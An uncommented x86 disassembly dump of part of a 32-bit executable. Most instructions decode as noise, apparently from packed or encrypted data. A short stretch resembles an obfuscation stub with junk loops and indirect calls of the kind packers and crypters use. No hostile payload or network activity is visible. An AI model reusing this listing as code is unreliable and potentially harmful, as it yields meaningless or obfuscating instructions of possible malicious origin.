  40a798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a799:	xor    ebp,DWORD PTR [ebx+0x18]
  40a79c:	and    esp,ecx
  40a79e:	mov    edi,ebp
  40a7a0:	addr16 leave 
  40a7a2:	call   0x4a5a679
  40a7a7:	mov    al,0x2a
  40a7a9:	inc    ebp
  40a7aa:	push   edi
  40a7ab:	pop    eax
  40a7ac:	sbb    eax,0x4f09adf7
  40a7b1:	cmc    
  40a7b2:	cmp    eax,0xb93f9d68
  40a7b7:	mov    ebp,DWORD PTR [edi-0x3aa7a000]
  40a7bd:	shr    DWORD PTR [eax+0x50da7619],0xb5
  40a7c4:	nop
  40a7c5:	mov    cl,0x2a
  40a7c7:	and    al,0xba
  40a7c9:	jnp    0x40a7e5
  40a7cb:	cdq    
  40a7cc:	popf   
  40a7cd:	es dec edx
  40a7cf:	dec    esp
  40a7d0:	mov    ah,0x91
  40a7d2:	popa   
  40a7d3:	cs mov esi,0xb00a2a3c
  40a7d9:	mov    cl,0xd6
  40a7db:	mov    DWORD PTR [eax+0x4f],ecx
  40a7de:	inc    ebp
  40a7df:	jne    0x40a827
  40a7e1:	mov    al,ds:0xdc9d88e9
  40a7e6:	mov    bh,0x93
  40a7e8:	adc    eax,0xec930048
  40a7ed:	gs push 0x11
  40a7f0:	(bad)  
  40a7f1:	fild   QWORD PTR [ebp-0x66f31f21]
  40a7f7:	sbb    al,0x7
  40a7f9:	pop    ds
  40a7fa:	sub    DWORD PTR [edx+0x73],edx
  40a7fd:	in     al,0x69
  40a7ff:	push   ecx
  40a800:	stos   BYTE PTR es:[edi],al
  40a801:	pop    ss
  40a802:	jno    0x40a7f6
  40a804:	sti    
  40a805:	sub    bl,BYTE PTR [ebp-0x35d040c0]
  40a80b:	addr16 jle 0x40a7e0
  40a80e:	adc    BYTE PTR [ecx+eiz*8-0x74],ch
  40a812:	push   cs
  40a813:	pop    ebp
  40a814:	mov    edx,0x2ee6e76a
  40a819:	dec    ecx
  40a81a:	dec    esp
  40a81b:	and    al,0x58
  40a81d:	shl    BYTE PTR [ebx-0x2a],0x88
  40a821:	push   es
  40a822:	mov    eax,DWORD PTR [esi+0x3e]
  40a825:	dec    esi
  40a826:	int3   
  40a827:	stc    
  40a828:	test   BYTE PTR [ebp+edx*8+0x258411a6],bh
  40a82f:	and    ch,dl
  40a831:	jg     0x40a7cd
  40a833:	sti    
  40a834:	and    eax,edi
  40a836:	inc    ebp
  40a837:	mov    DWORD PTR [ebp+0x1c71eda0],ecx
  40a83d:	ss cs pop esi
  40a840:	test   BYTE PTR [eax-0x5e062b33],bl
  40a846:	mov    DWORD PTR [ebx+0x38],ebx
  40a849:	in     al,0xbe
  40a84b:	xor    DWORD PTR [edx],ebx
  40a84d:	loopne 0x40a7fb
  40a84f:	pop    edx
  40a850:	mov    eax,ds:0x365e2bc8
  40a855:	pop    esp
  40a856:	mov    bh,0xe
  40a858:	outs   dx,BYTE PTR ds:[esi]
  40a859:	lods   eax,DWORD PTR ds:[esi]
  40a85a:	dec    edx
  40a85b:	mul    BYTE PTR [edi]
  40a85d:	pop    es
  40a85e:	mov    ah,0x81
  40a860:	xchg   ebp,eax
  40a861:	test   BYTE PTR ds:0x98023050,ah
  40a867:	scas   al,BYTE PTR es:[edi]
  40a868:	retf   0x35af
  40a86b:	out    dx,eax
  40a86c:	jo     0x40a882
  40a86e:	retf   0x1ec4
  40a871:	adc    esp,DWORD PTR [esi+0x39]
  40a874:	loop   0x40a88e
  40a876:	aad    0x15
  40a878:	and    DWORD PTR [ebp+0x93e1387],esi
  40a87e:	(bad)  
  40a87f:	out    dx,al
  40a880:	dec    ebp
  40a881:	(bad)  
  40a882:	lods   eax,DWORD PTR ds:[esi]
  40a883:	cmc    
  40a884:	mov    ah,dl
  40a886:	je     0x40a827
  40a888:	leave  
  40a889:	mov    WORD PTR [esi],cs
  40a88b:	mov    ch,0xe
  40a88d:	mov    dh,0x3a
  40a88f:	shl    DWORD PTR gs:[ecx],cl
  40a892:	loop   0x40a8a1
  40a894:	cs xor al,0x12
  40a897:	inc    ebx
  40a898:	test   DWORD PTR ds:0xcc1e14f5,esp
  40a89e:	adc    DWORD PTR [edi+ecx*8-0x47],0x1aea1aa3
  40a8a6:	add    al,0xee
  40a8a8:	xchg   ecx,eax
  40a8a9:	mov    edx,0xfbc8c60c
  40a8ae:	inc    ecx
  40a8af:	sbb    dh,BYTE PTR [eax]
  40a8b1:	aam    0x51
  40a8b3:	cwde   
  40a8b4:	sub    BYTE PTR [edi-0x1d],ch
  40a8b7:	adc    dh,dh
  40a8b9:	mov    DWORD PTR fs:[eax],ebp
  40a8bc:	or     BYTE PTR [ebx-0x1d],cl
  40a8bf:	outs   dx,DWORD PTR ds:[esi]
  40a8c0:	mov    al,0xbf
  40a8c2:	xchg   ebp,eax
  40a8c3:	imul   ebp,DWORD PTR [edx+0x14],0x20ceea7c
  40a8ca:	ja     0x40a862
  40a8cc:	mov    dh,0x4d
  40a8ce:	aad    0xbd
  40a8d0:	out    0x57,al
  40a8d2:	ja     0x40a8b5
  40a8d4:	lods   eax,DWORD PTR ds:[esi]
  40a8d5:	in     eax,0x88
  40a8d7:	dec    ecx
  40a8d8:	jae    0x40a887
  40a8da:	add    al,0x62
  40a8dc:	dec    esp
  40a8dd:	jbe    0x40a8de
  40a8df:	cmp    BYTE PTR [esi],0x65
  40a8e2:	push   edx
  40a8e3:	in     eax,0xa7
  40a8e5:	imul   eax,edi,0x55
  40a8e8:	fs push 0xfef7dff4
  40a8ee:	sbb    al,0x46
  40a8f0:	aas    
  40a8f1:	and    bl,BYTE PTR [edx+0x33]
  40a8f4:	out    0x9f,eax
  40a8f6:	gs clc 
  40a8f8:	or     eax,0xdb0b9c2a
  40a8fd:	les    eax,FWORD PTR [edx-0x60]
  40a900:	loope  0x40a975
  40a902:	inc    edx
  40a903:	or     BYTE PTR [ebp-0x72b09e9e],cl
  40a909:	dec    ebx
  40a90a:	lahf   
  40a90b:	mov    bh,0xf1
  40a90d:	shl    esi,cl
  40a90f:	stc    
  40a910:	ffreep st(6)
  40a912:	data16 mul BYTE PTR ds:0x9bfbf6ce
  40a919:	int3   
  40a91a:	cmp    DWORD PTR [ebx],esi
  40a91c:	ffree  st(7)
  40a91e:	cmp    eax,0x94bb846
  40a923:	inc    edi
  40a924:	pop    ebx
  40a925:	aam    0x79
  40a927:	call   0x5c77fb35
  40a92c:	dec    edx
  40a92d:	shl    DWORD PTR [edx-0x2b],0x4a
  40a931:	xor    al,0x50
  40a933:	mov    DWORD PTR [edx-0x72],ebx
  40a936:	xor    edi,esi
  40a938:	leave  
  40a939:	repz mov dl,0xd6
  40a93c:	(bad)  
  40a93d:	aam    0xbb
  40a93f:	jp     0x40a8ef
  40a941:	adc    BYTE PTR [edi],al
  40a943:	push   0xffffff84
  40a945:	xor    al,0xd5
  40a947:	add    ah,BYTE PTR ds:0x335dbefb
  40a94d:	mov    eax,0x9b65638a
  40a952:	push   edx
  40a953:	shl    BYTE PTR [eax-0x14],0x43
  40a957:	ja     0x40a940
  40a959:	inc    ecx
  40a95a:	cld    
  40a95b:	xchg   edi,eax
  40a95c:	(bad)  
  40a95d:	in     eax,0x28
  40a95f:	jbe    0x40a98b
  40a961:	not    DWORD PTR [esi]
  40a963:	fs enter 0x520b,0xd5
  40a968:	dec    ecx
  40a969:	imul   eax,DWORD PTR [esi],0x62b5c956
  40a96f:	mov    ebp,0x64269e38
  40a974:	xor    esp,DWORD PTR [edx]
  40a976:	add    BYTE PTR [edx-0x79cc4531],ch
  40a97c:	mov    ah,0x4f
  40a97e:	ss push edx
  40a980:	pushf  
  40a981:	adc    eax,0x12380980
  40a986:	jae    0x40a924
  40a988:	jbe    0x40a925
  40a98a:	retf   
  40a98b:	mov    dh,0xbf
  40a98d:	xchg   ebx,eax
  40a98e:	add    ch,cl
  40a990:	xchg   DWORD PTR [esi-0x7f],edx
  40a993:	or     eax,0x428e7f
  40a998:	loope  0x40aa14
  40a99a:	add    BYTE PTR [eax],al
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42aa3f
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42aa0b
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429bcb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42aa0f
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	es pop ebx
  40aafd:	arpl   WORD PTR [edi],bp
  40aaff:	out    0xf6,eax
  40ab01:	add    DWORD PTR [ebx-0x7c7c9f0f],0x7e
  40ab08:	push   es
  40ab09:	mov    ecx,0x3d1cd0a1
  40ab0e:	xor    dh,dl
  40ab10:	add    BYTE PTR [edi+eiz*1],0x79
  40ab14:	xchg   cx,ax
  40ab16:	in     al,dx
  40ab17:	arpl   WORD PTR [ecx-0x250ee480],ax
  40ab1d:	imul   edx,DWORD PTR [edx+ebp*8],0xa5de9e84
  40ab24:	adc    BYTE PTR [edi+0x78],ah
  40ab27:	mov    al,ds:0x3752ecf0
  40ab2c:	mov    ds:0xb3a5278c,al
  40ab31:	in     al,dx
  40ab32:	cmp    al,0xb4
  40ab34:	sbb    edx,0x5c4aec14
  40ab3a:	adc    BYTE PTR [esi+0x7b],bl
  40ab3d:	mul    DWORD PTR [esi+0x62375c63]
  40ab43:	ret    0xb783
  40ab46:	or     al,0xfa
  40ab48:	jns    0x40aafa
  40ab4a:	mov    al,ds:0x4ea2a886
  40ab4f:	stc    
  40ab50:	dec    esi
  40ab51:	aaa    
  40ab52:	sub    cl,dl
  40ab54:	push   ss
  40ab55:	(bad)  
  40ab57:	jge    0x40aaf7
  40ab59:	mov    ds:0xc2d7e8d0,eax
  40ab5e:	pop    esp
  40ab5f:	mov    ecx,0x68ed1278
  40ab64:	out    dx,eax
  40ab65:	popa   
  40ab66:	loopne 0x40aaf7
  40ab68:	into   
  40ab69:	sar    ebp,cl
  40ab6b:	pop    eax
  40ab6c:	xchg   edx,eax
  40ab6d:	mov    ch,0x3f
  40ab6f:	pop    ss
  40ab70:	repz movzx ebx,cx
  40ab74:	popa   
  40ab75:	jl     0x40abde
  40ab77:	out    0xb6,al
  40ab79:	xchg   ebx,eax
  40ab7a:	or     ecx,esi
  40ab7c:	cmp    eax,0xc7a04782
  40ab81:	scas   al,BYTE PTR es:[edi]
  40ab82:	or     DWORD PTR [eax],ebp
  40ab84:	dec    ecx
  40ab85:	popa   
  40ab86:	int    0x30
  40ab88:	fwait
  40ab89:	mov    ebx,gs
  40ab8b:	scas   al,BYTE PTR es:[edi]
  40ab8c:	pop    eax
  40ab8d:	xchg   BYTE PTR [ebp-0xd35a548],cl
  40ab93:	push   esp
  40ab94:	dec    eax
  40ab95:	call   0x45475281
  40ab9a:	push   0xfe59f2f1
  40ab9f:	push   cs
  40aba0:	shl    esp,1
  40aba2:	ins    DWORD PTR es:[edi],dx
  40aba3:	xor    DWORD PTR [eax+0x12b83d69],ebp
  40aba9:	test   ah,dh
  40abab:	ja     0x40ab2d
  40abad:	fstp   TBYTE PTR gs:[ebp-0x10]
  40abb1:	sub    edx,ebx
  40abb3:	jle    0x40ac34
  40abb5:	fcom   QWORD PTR [eax-0x5b5b0736]
  40abbb:	out    0x3,al
  40abbd:	imul   edx,DWORD PTR [ebx+edx*1-0x2f],0x64
  40abc2:	out    0xd7,al
  40abc4:	jae    0x40ab64
  40abc6:	daa    
  40abc7:	std    
  40abc8:	xor    ebx,DWORD PTR [eax+0x12]
  40abcb:	sbb    ebp,DWORD PTR [ecx-0x39]
  40abce:	adc    al,0x1b
  40abd0:	arpl   WORD PTR [edx-0x38441e86],dx
  40abd6:	(bad)  
  40abd7:	in     al,0xdf
  40abd9:	out    dx,eax
  40abda:	aad    0xa0
  40abdc:	cmp    ecx,DWORD PTR [edx+0x23]
  40abdf:	push   cs
  40abe0:	or     DWORD PTR [esi+0x53],edx
  40abe3:	je     0x40ac5e
  40abe5:	xor    BYTE PTR [edi+0x47],dh
  40abe8:	push   ds
  40abe9:	test   al,0xf3
  40abeb:	cwde   
  40abec:	add    eax,0x44bf5556
  40abf1:	adc    eax,0xee969851
  40abf6:	mov    edx,0x682364e7
  40abfb:	add    al,0xe5
  40abfd:	inc    edx
  40abfe:	adc    BYTE PTR [edx-0x23a8c200],dh
  40ac04:	jmp    0x40ac39
  40ac06:	fsubr  st(0),st
  40ac08:	mov    edi,0xead58af5
  40ac0d:	(bad)  
  40ac0f:	mov    ch,0x97
  40ac11:	pushf  
  40ac12:	into   
  40ac13:	adc    cl,dl
  40ac15:	jg     0x40abbf
  40ac17:	mov    bl,BYTE PTR [ebp-0x32]
  40ac1a:	inc    ebx
  40ac1b:	or     al,0x6e
  40ac1d:	bound  ebp,QWORD PTR [edi-0x6adadc26]
  40ac23:	cwde   
  40ac24:	pop    edx
  40ac25:	cmp    BYTE PTR [ebp+0x9],dh
  40ac28:	pop    ecx
  40ac29:	jge    0x40abd6
  40ac2b:	mov    al,0x86
  40ac2d:	enter  0xfeff,0x16
  40ac31:	ret    
  40ac32:	sub    al,BYTE PTR ds:[ebx-0x1f42b337]
  40ac39:	imul   BYTE PTR [edx]
  40ac3b:	mov    ecx,0xf75aa119
  40ac40:	mov    ebx,0xc24a90e8
  40ac45:	les    edx,FWORD PTR [ecx-0x3a]
  40ac48:	dec    edi
  40ac49:	xlat   BYTE PTR ds:[ebx]
  40ac4a:	call   0xf091:0x932cbd40
  40ac51:	mov    bl,0xc4
  40ac53:	xchg   esp,eax
  40ac54:	clc    
  40ac55:	lods   eax,DWORD PTR ds:[esi]
  40ac56:	js     0x40acaf
  40ac58:	or     DWORD PTR [edx+0x66494bc8],ebp
  40ac5e:	xor    eax,0xee790aa1
  40ac63:	js     0x40abef
  40ac65:	jle    0x40ac8f
  40ac67:	test   ecx,0x1438993c
  40ac6d:	data16 mov WORD PTR ds:0xea4d11f4,fs
  40ac74:	push   esp
  40ac75:	sti    
  40ac76:	or     DWORD PTR [esi-0x2a],edi
  40ac79:	shl    BYTE PTR [edx+0x2],0x5a
  40ac7d:	in     al,dx
  40ac7e:	cmp    bh,cl
  40ac80:	stc    
  40ac81:	popf   
  40ac82:	cld    
  40ac83:	sbb    cl,ch
  40ac85:	cmp    BYTE PTR [edi],cl
  40ac87:	or     eax,0xe844ac48
  40ac8c:	stc    
  40ac8d:	add    BYTE PTR [edi],dl
  40ac8f:	out    dx,eax
  40ac90:	xchg   BYTE PTR [ecx-0x351d8329],bl
  40ac96:	out    dx,eax
  40ac97:	add    eax,0x2677960f
  40ac9c:	sbb    al,0xea
  40ac9e:	sub    BYTE PTR [ecx-0x4289dd3c],dl
  40aca4:	push   0x4641fe67
  40aca9:	mov    dh,0xe8
  40acab:	mov    DWORD PTR [edx],edi
  40acad:	retf   
  40acae:	shl    DWORD PTR [edi-0x76594361],0xe7
  40acb5:	and    ch,al
  40acb7:	dec    ebx
  40acb8:	pop    esi
  40acb9:	jae    0x40ad20
  40acbb:	(bad)  
  40acbc:	dec    esp
  40acbd:	cmp    ch,al
  40acbf:	sahf   
  40acc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acc1:	push   edx
  40acc2:	xchg   edi,eax
  40acc3:	add    al,0x6b
  40acc5:	mov    ch,BYTE PTR [ebp+0x53]
  40acc8:	in     eax,0x2
  40acca:	pusha  
  40accb:	jmp    0x40acfd
  40accd:	mov    bh,0xb3
  40accf:	adc    ch,al
  40acd1:	inc    ebp
  40acd2:	xchg   cx,ax
  40acd4:	mov    ebp,0x607d2c9
  40acd9:	in     eax,dx
  40acda:	cmp    esp,0xa496bdab
  40ace0:	cdq    
  40ace1:	xchg   ecx,eax
  40ace2:	mov    bh,0x13
  40ace4:	clc    
  40ace5:	cmp    eax,DWORD PTR [edx+0x719b941f]
  40aceb:	add    ecx,DWORD PTR [ecx]
  40aced:	and    DWORD PTR [esi-0x6d],edi
  40acf0:	xchg   edx,eax
  40acf1:	or     al,0x8f
  40acf3:	mov    dh,BYTE PTR [eax]
  40acf5:	inc    ecx
  40acf6:	or     esp,DWORD PTR [ecx]
  40acf8:	movsx  ecx,WORD PTR [edi+0x46]
  40acfc:	int3   
  40acfd:	sub    eax,0xe1cdc2cd
  40ad02:	(bad)  
  40ad03:	loopne 0x40acd7
  40ad05:	scas   al,BYTE PTR es:[edi]
  40ad06:	mov    ecx,ebp
  40ad08:	jg     0x40acd6
  40ad0a:	fiadd  WORD PTR [edi-0x9ba8d0e]
  40ad10:	test   BYTE PTR [edi-0xd38461a],bl
  40ad16:	mov    ch,0xf9
  40ad18:	cmp    eax,0x51c6918c
  40ad1d:	jbe    0x40ad21
  40ad1f:	push   ecx
  40ad20:	push   ebp
  40ad21:	rol    DWORD PTR [ecx-0xed61d6f],0x20
  40ad28:	dec    ebx
  40ad29:	mov    BYTE PTR [edi],dl
  40ad2b:	shr    DWORD PTR [ebx+0x5b8750fa],1
  40ad31:	or     ebp,DWORD PTR [esi+0x12]
  40ad34:	dec    esp
  40ad35:	mov    ebx,0x1f4756c0
  40ad3a:	pop    ebx
  40ad3b:	mov    ch,0xba
  40ad3d:	mov    bl,0x74
  40ad3f:	adc    DWORD PTR [eax],edi
  40ad41:	and    eax,0xcf6e4038
  40ad46:	cmp    al,0xf0
  40ad48:	fidivr DWORD PTR [edx-0x3a6b2611]
  40ad4e:	(bad)  
  40ad4f:	cmc    
  40ad50:	cmp    ebx,DWORD PTR [edx+ecx*8+0xc]
  40ad54:	and    BYTE PTR [esi+ecx*2-0xc],dl
  40ad58:	call   0xa5549e51
  40ad5d:	pop    ecx
  40ad5e:	push   esi
  40ad5f:	and    ecx,DWORD PTR [edi+eax*2+0x3f]
  40ad63:	sub    eax,0xa145b399
  40ad68:	cmovns ecx,DWORD PTR [ebp+0x2b]
  40ad6c:	push   es
  40ad6d:	ror    DWORD PTR [edi+0x249dda94],cl
  40ad73:	dec    esp
  40ad74:	js     0x40adb9
  40ad76:	aam    0x17
  40ad78:	mov    ah,0x9
  40ad7a:	mov    bh,0x84
  40ad7c:	ds rcr ecx,1
  40ad7f:	xor    edx,ecx
  40ad81:	fstp   QWORD PTR [ecx-0x47]
  40ad84:	jnp    0x40ad5b
  40ad86:	pop    esp
  40ad87:	or     BYTE PTR [edi-0x3a919a4],al
  40ad8d:	sub    dh,ah
  40ad8f:	mov    ecx,0x6c85fc4f
  40ad94:	xor    eax,0x9775701e
  40ad99:	cmp    bl,ch
  40ad9b:	arpl   di,di
  40ad9d:	push   edx
  40ad9e:	mov    DWORD PTR [esi+edi*1],ebp
  40ada1:	iret   
  40ada2:	dec    ebp
  40ada3:	dec    edx
  40ada4:	inc    ebx
  40ada5:	xchg   ecx,eax
  40ada6:	mov    al,ds:0x4cdccd8d
  40adab:	mov    dh,0xd7
  40adad:	inc    ecx
  40adae:	cmp    al,0x5
  40adb0:	fs scas eax,DWORD PTR es:[edi]
  40adb2:	jge    0x40adf1
  40adb4:	or     al,0xfa
  40adb6:	pushw  0x18
  40adb9:	fstp   DWORD PTR [eax-0x41]
  40adbc:	xchg   esi,eax
  40adbd:	adc    dl,dh
  40adbf:	xchg   esi,eax
  40adc0:	mov    ch,0x32
  40adc2:	mov    cl,0x64
  40adc4:	rcr    DWORD PTR [ebp+eiz*8-0x46],cl
  40adc8:	xor    al,BYTE PTR [ebx-0x7d]
  40adcb:	test   DWORD PTR [esi],edx
  40adcd:	sub    eax,0xd75c56e
  40add2:	jbe    0x40ad7c
  40add4:	sbb    ebp,DWORD PTR [ecx+0x57]
  40add7:	xor    DWORD PTR [esi],0xffffffca
  40adda:	dec    esi
  40addb:	push   0x38
  40addd:	push   es
  40adde:	ret    
  40addf:	(bad)  [ecx+ebp*4+0x4c888814]
  40ade6:	mov    ebp,0xf3db77c2
  40adeb:	xchg   esi,eax
  40adec:	daa    
  40aded:	pop    ebx
  40adee:	mov    bh,0x6d
  40adf0:	adc    eax,0x2fd07033
  40adf5:	mov    eax,0xfe6e3606
  40adfa:	dec    eax
  40adfb:	inc    ebx
  40adfc:	xchg   edx,eax
  40adfd:	cs inc esi
  40adff:	or     eax,edi
  40ae01:	pushf  
  40ae02:	jge    0x40ae31
  40ae04:	and    al,0x87
  40ae06:	push   cs
  40ae07:	lock int3 
  40ae09:	out    0x42,al
  40ae0b:	int3   
  40ae0c:	dec    edi
  40ae0d:	push   ebp
  40ae0e:	xor    ecx,DWORD PTR [edi]
  40ae10:	std    
  40ae11:	jle    0x40ae58
  40ae13:	cli    
  40ae14:	les    ecx,FWORD PTR [eax+0x45]
  40ae17:	(bad)  [esi+0x18]
  40ae1a:	push   esi
  40ae1b:	xchg   edi,eax
  40ae1c:	jno    0x40ae22
  40ae1e:	int    0x9a
  40ae20:	in     eax,0x76
  40ae22:	sbb    eax,0xd958263b
  40ae27:	or     ax,0x379d
  40ae2b:	dec    ebp
  40ae2c:	cwde   
  40ae2d:	xchg   esp,eax
  40ae2e:	mov    al,ds:0x6b58984f
  40ae33:	mov    edi,0x2faf1d56
  40ae38:	repz daa 
  40ae3a:	scas   eax,DWORD PTR es:[edi]
  40ae3b:	sub    ch,BYTE PTR ds:0xabf3dd29
  40ae41:	xor    ch,BYTE PTR [ebx+0x53b6d813]
  40ae47:	pop    edx
  40ae48:	pop    eax
  40ae49:	imul   DWORD PTR [ebx-0x6d]
  40ae4c:	pop    esi
  40ae4d:	call   0xa91a:0x41f21c9c
  40ae54:	sbb    ebx,ecx
  40ae56:	std    
  40ae57:	retf   0x2201
  40ae5a:	mov    eax,0x7bb0fba6
  40ae5f:	rcr    BYTE PTR [edi],1
  40ae61:	das    
  40ae62:	neg    DWORD PTR [edx]
  40ae64:	adc    esi,DWORD PTR [esi+0x63360553]
  40ae6a:	add    ecx,esi
  40ae6c:	mov    esi,DWORD PTR fs:[ebp-0x7]
  40ae70:	mov    ebp,0x13b7b0bd
  40ae75:	mov    bh,0xb4
  40ae77:	mov    DWORD PTR [edx],ebp
  40ae79:	adc    dh,bh
  40ae7b:	inc    ecx
  40ae7c:	enter  0xb938,0x94
  40ae80:	leave  
  40ae81:	sahf   
  40ae82:	xor    BYTE PTR [ecx-0x4c248a92],0x64
  40ae89:	jmp    0x40aef4
  40ae8b:	(bad)  
  40ae8c:	mov    edx,0xefe40409
  40ae91:	call   0xb07d3393
  40ae96:	lods   eax,DWORD PTR ds:[esi]
  40ae97:	out    0x8c,al
  40ae99:	add    DWORD PTR [ebp+edi*2+0x39],ebp
  40ae9d:	mov    eax,0xbd16deff
  40aea2:	stos   BYTE PTR es:[edi],al
  40aea3:	leave  
  40aea4:	adc    al,0xd6
  40aea6:	hlt    
  40aea7:	sbb    eax,0xf05c7cbf
  40aeac:	(bad)  
  40aead:	imul   esi,DWORD PTR [esi+0x56],0x79
  40aeb1:	stc    
  40aeb2:	je     0x40aed0
  40aeb4:	inc    edi
  40aeb5:	sbb    al,0x8
  40aeb7:	mov    DWORD PTR [ebx-0x23],edi
  40aeba:	or     bl,BYTE PTR [ebp+0x1c7c1f0c]
  40aec0:	dec    ecx
  40aec1:	nop
  40aec2:	adc    DWORD PTR [ebx],edx
  40aec4:	pop    eax
  40aec5:	nop
  40aec6:	aad    0xbe
  40aec8:	test   al,0x6e
  40aeca:	jno    0x40aee2
  40aecc:	cmp    ebp,edx
  40aece:	lock mov esp,0x82351002
  40aed4:	repz test DWORD PTR [eax-0x36],eax
  40aed8:	mov    esp,0xbdd4b62f
  40aedd:	mov    ah,0xd3
  40aedf:	shl    BYTE PTR [ebx-0x1a],cl
  40aee2:	mov    esi,0xf8c27d97
  40aee7:	push   ds
  40aee8:	and    eax,0x45e7582d
  40aeed:	repz int 0x6c
  40aef0:	outs   dx,DWORD PTR ds:[esi]
  40aef1:	mov    edi,0x4d16c7da
  40aef6:	enter  0xb8e7,0x99
  40aefa:	push   ds
  40aefb:	mov    eax,ds:0x224815a5
  40af00:	xchg   BYTE PTR [ebx-0x7b],ah
  40af03:	bound  esp,QWORD PTR [eax+0x6ca23f21]
  40af09:	call   0xe279db3a
  40af0e:	rol    BYTE PTR es:[ebx+0x7c61c934],cl
  40af15:	lock retf 
  40af17:	pop    eax
  40af18:	cmp    DWORD PTR [ecx],edi
  40af1a:	adc    al,0x95
  40af1c:	sets   BYTE PTR [esi+0x57]
  40af20:	add    BYTE PTR [ebp-0x228245cb],bl
  40af26:	add    bl,BYTE PTR [edx-0x17]
  40af29:	les    edx,FWORD PTR [ebx]
  40af2b:	test   al,0xf7
  40af2d:	pusha  
  40af2e:	call   0x2808:0xfd058e79
  40af35:	jle    0x40af79
  40af37:	cmp    DWORD PTR [ebp-0x5f8c0a16],esi
  40af3d:	mov    WORD PTR [edi+edx*8],fs
  40af40:	jae    0x40af8d
  40af42:	test   al,0xec
  40af44:	shl    BYTE PTR [ebx+ebx*4-0x71],cl
  40af48:	mov    BYTE PTR [eax-0x29c726c8],bh
  40af4e:	fmul   QWORD PTR [edi]
  40af50:	ror    DWORD PTR [ebp-0x18],0x17
  40af54:	cmp    bl,BYTE PTR [ecx+0x5a]
  40af57:	int3   
  40af58:	pop    edi
  40af59:	cmp    ebx,DWORD PTR [edi+0x228353f]
  40af5f:	bnd jmp 0xaf78b77f
  40af65:	jg     0x40af2b
  40af67:	call   0xdb5b:0x2be69ec9
  40af6e:	gs retf 
  40af70:	mov    ds:0xb18d1443,eax
  40af75:	call   0xb973:0x53532c23
  40af7c:	push   edx
  40af7d:	add    al,0x85
  40af7f:	adc    BYTE PTR [esi-0x4cb9a543],0xc0
  40af86:	loope  0x40af29
  40af88:	scas   al,BYTE PTR es:[edi]
  40af89:	ins    BYTE PTR es:[edi],dx
  40af8a:	stos   BYTE PTR es:[edi],al
  40af8b:	dec    DWORD PTR [edx+0xa]
  40af8e:	xor    DWORD PTR [edx-0xf],esi
  40af91:	fisubr WORD PTR [eax+0x27]
  40af94:	ja     0x40af2b
  40af96:	(bad)  
  40af97:	jo     0x40afb5
  40af99:	pop    ebx
  40af9a:	fdivp  st(4),st
  40af9c:	in     al,0x43
  40af9e:	sti    
  40af9f:	dec    eax
  40afa0:	mov    al,0xc5
  40afa2:	sub    ebp,DWORD PTR [edi]
  40afa4:	int3   
  40afa5:	cdq    
  40afa6:	push   ecx
  40afa7:	fadd   st(2),st
  40afa9:	ret    0x5a9e
  40afac:	test   eax,0xa135d41f
  40afb1:	jmp    0x40b02b
  40afb3:	pop    ds
  40afb4:	fstp   DWORD PTR [esp]
  40afb7:	xor    esi,ebp
  40afb9:	mov    edi,0x27062f2f
  40afbe:	hlt    
  40afbf:	cmp    esi,DWORD PTR [eax+0x37209ec9]
